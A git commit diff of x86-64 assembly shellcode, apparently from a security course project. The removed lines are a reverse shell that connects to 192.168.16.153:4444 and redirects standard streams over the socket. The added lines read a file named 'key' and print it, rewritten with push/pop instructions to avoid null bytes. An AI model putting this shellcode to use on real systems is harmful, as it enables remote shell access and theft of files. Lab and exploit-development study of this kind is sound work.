c113f210c66ed3ffd7ecddc089bd57586c9a530e
burkus <lucas.burke@pm.me>
2019-05-24 14:58:19 -0700

    IT WORKS!

--- Project 3/part3.asm
+++ Project 3/part3.asm
@@ -3,77 +3,70 @@ global _start
 section .text
 _start:
 
-; create socket (from reverse shell code)
-  push rbp
-  mov rbp,rsp
-  xor rdx, rdx
-  push 1
-  pop rsi
-  push 2
-  pop rdi
-  push 41
-  pop rax ; sys_socket
-  syscall
-  
-; make struct and call connect
-  sub rsp, 8
-  mov dword [rsp], 0xc1df0002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
-  mov dword [rsp+4], 0x9910a8c0 ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
-  lea rsi, [rsp]
-  add rsp, 8
-  pop rbx
-  xor rbx, rbx
-  push 16
-  pop rdx
-  push 3
-  pop rdi
-  push 42
-  pop rax; sys_connect
-  syscall
-
-;dupe connections
-  xor r8, r8
-  mov r8, 2 ; start at stderr and dup/dec down to zero
-  .loop_fd:
-      mov rdi, r9
-      mov rax, 33 ;dup2
-      mov rsi, r8
-      syscall
-  dec r8
-  jns .loop_fd ;jump not sign-> checks sign flag
-  
-
-xor r15, r15 ; for the fd
 
 ;open
   push 0x79656b
-  mov rdi, rsp
+  push rsp
+  pop rdi
+  ;mov rdi, rsp
   xor rsi, rsi ; flags = O_RDONLY
-  mov rdx, rsi ; mode = NULL
+  push rsi
+  pop rdx
+  ;mov rdx, rsi ; mode = NULL
   xor rax, rax
-  mov rax, 2	; = 2
+  push 2
+  pop rax
+  ;mov rax, 2	; = 2
   syscall
-  mov r15, rax
+  push rax
+  pop r15
+  ;mov r15, rax
+  
+  
+  ;mov rsi, 1
+  ;mov rdi, r13
+  ;mov rax, 33 ;dup2
+  ;syscall
+  ;mov r14, rax
   
 loop_in: 
-  ; read syscall args
-  mov rdi, r15 ;fd from open
-  lea rsi, [rsp-1] ;store a byte at [rsp-1]
-  mov rdx, 1
-  mov rax, 0 
+  push r15
+  pop rdi
+  lea rsi, [rsp-1]
+  push 1
+  pop rdx
+  push 0
+  pop rax
   syscall
+  
+  ; read syscall args
+  ;mov rdi, r15 ;fd from open
+  ;lea rsi, [rsp-1]
+  ;mov rdx, 1
+  ;mov rax, 0 
+  ;syscall
 
   ; check for input
   cmp rax, 1
   jne end
 
 loop_out:
-  ; write syscall args
-  mov rdi, 1 ;write to stdout
+  push rax
+  pop rdi
   lea rsi, [rsp-1]
-  mov rdx, 1
-  mov rax, 1 
+  push 1
+  pop rdx
+  push 1
+  pop rax
   syscall
+
+
+  ; write syscall args
+  ;mov rdi, rax ;write to stdout
+  ;lea rsi, [rsp-1]
+  ;mov rdx, 1
+  ;mov rax, 1 
+  ;syscall
 
   cmp rax, 1
   jne end
@@ -81,9 +74,8 @@ loop_out:
   jmp loop_in ; start over
 
 end:
-  ; exit
-  mov edi, 0
-  mov eax, 60
+  push 0x3c
+  pop rax
   syscall
 
 
